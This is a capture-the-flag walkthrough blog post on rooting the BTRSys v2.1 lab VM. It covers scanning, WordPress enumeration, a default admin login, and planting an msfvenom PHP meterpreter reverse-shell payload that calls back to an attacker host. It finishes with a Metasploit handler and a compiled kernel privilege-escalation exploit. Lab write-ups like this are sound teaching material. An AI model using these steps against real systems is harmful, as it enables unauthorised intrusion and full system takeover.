@@ -1,0 +1,394 @@
+
+								
+																		Hack the BTRSys: v2.1 VM (Boot2Root Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges, Kali Linux, Penetration Testing									
+									
+									
+									on October 19, 2017
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									BTRSys is boot2root challenge developed by ‘ismailonderkaya’ in the series of BRTSys. This is an amazing lab for practice which has covered every technique.
+Difficulty level: Intermediate
+WalkThrough
+Let’s start by finding our target. And for that use the following command.
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+We know our target is 192.168.0.106 so, therefore, apply nmap on it as it will help us know which ports and services are open. Use the following command:
+
+		
+		
+			
+			
+			
+			
+nmap -A 192.168.0.106
+			
+				
+					
+				
+					1
+				
+						nmap -A 192.168.0.106
+					
+				
+			
+		
+
+
+Due to nmap, you can see that port 21, 22 and 80 are open with the service of FTP, SSH, and HTTP respectively. As we still have a lot to find about this, we decided to use DIRB. Dirb is web-scanner i.e. it will scan the whole web application for file/directories. It will even show the hidden files. Use the following command:
+
+		
+		
+			
+			
+			
+			
+dirb http://192.168.0.106
+			
+				
+					
+				
+					1
+				
+						dirb http://192.168.0.106
+					
+				
+			
+		
+
+
+As you can see in the above image that using dirb we found various files and directories such as robots.txt, upload, etc. but you can also see that our target web application is using WordPress, so, we can easily apply a WordPress scan using the following command which covers themes, plugins, and users:
+
+		
+		
+			
+			
+			
+			
+./wpscan.rb -u http://192.168.0.106/wordpress/ --enumerate at --enumerate ap --enumerate u
+			
+				
+					
+				
+					1
+				
+						./wpscan.rb -u http://192.168.0.106/wordpress/ --enumerate at --enumerate ap --enumerate u
+					
+				
+			
+		
+
+
+As a result, we have found two users – btrisk and admin.
+
+Now if you try to login through admin using password admin you have the access of the dashboard. And once you have that access you can execute a malicious PHP code therein to have a meterpreter session. Use the following command:
+
+		
+		
+			
+			
+			
+			
+msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f raw
+			
+				
+					
+				
+					1
+				
+						msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.0.107 lport=4444 -f raw
+					
+				
+			
+		
+
+
+The above command will give you a php code which you have to execute. Copy the code from &lt;?php to die(); and paste it in the template as shown below :
+
+Once the code is uploaded, execute it through URL as shown :
+
+		
+		
+			
+			
+			
+			
+192.168.0.106/wordpress/wp-content/themes/twentyfourteen/404.php
+			
+				
+					
+				
+					1
+				
+						192.168.0.106/wordpress/wp-content/themes/twentyfourteen/404.php
+					
+				
+			
+		
+
+
+Before executing the above URL, make sure that your meterpreter handler is active. And to do so; go to Metasploit and type the following:
+
+		
+		
+			
+			
+			
+			
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 192.168.0.107
+set lport 4444
+exploit
+			
+				
+					
+				
+					12345
+				
+						use exploit/multi/handlerset payload php/meterpreter/reverse_tcpset lhost 192.168.0.107set lport 4444exploit
+					
+				
+			
+		
+
+Once the handler is active and the URL is executed, you will have your session. Let’s check the system’s information which we have entered and for this type:
+
+		
+		
+			
+			
+			
+			
+sysinfo
+			
+				
+					
+				
+					1
+				
+						sysinfo
+					
+				
+			
+		
+
+
+Now let’s get into the shell by simply typing:
+
+		
+		
+			
+			
+			
+			
+shell
+			
+				
+					
+				
+					1
+				
+						shell
+					
+				
+			
+		
+
+
+Through shell, we came to know that Ubuntu’s version is 16.04.2 and fortunately there is exploit in exploit-db for this version of Ubuntu. Download this exploit.
+
+This exploit will help you to have achieved privilege escalation so that you can directly access root. Once the exploit is downloaded, we need to compile it and for that type:
+
+		
+		
+			
+			
+			
+			
+gcc 41458.c -o rootshell
+			
+				
+					
+				
+					1
+				
+						gcc 41458.c -o rootshell
+					
+				
+			
+		
+
+
+Now that the exploit has been compiled, upload it in the /tmp directory. For that, you will need to go to /tmp directory. Use the following commands:
+
+		
+		
+			
+			
+			
+			
+cd /tmp
+upload /root/Desktop/rootshell .
+			
+				
+					
+				
+					12
+				
+						cd /tmpupload /root/Desktop/rootshell .
+					
+				
+			
+		
+
+
+Now go to shell&gt;/tmp and give the permission to the exploit root shell and execute it. Use the following commands:
+
+		
+		
+			
+			
+			
+			
+shell
+cd /tmp
+chmod 777 rootshell
+./rootshell
+			
+				
+					
+				
+					1234
+				
+						shellcd /tmpchmod 777 rootshell./rootshell
+					
+				
+			
+		
+
+And to confirm use the following command:
+
+		
+		
+			
+			
+			
+			
+whoami
+			
+				
+					
+				
+					1
+				
+						whoami
+					
+				
+			
+		
+
+
+HURRAY!!!! We are in the root. And so our Boot2Root challenge is complete.
+Author: Yashika Dhir is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
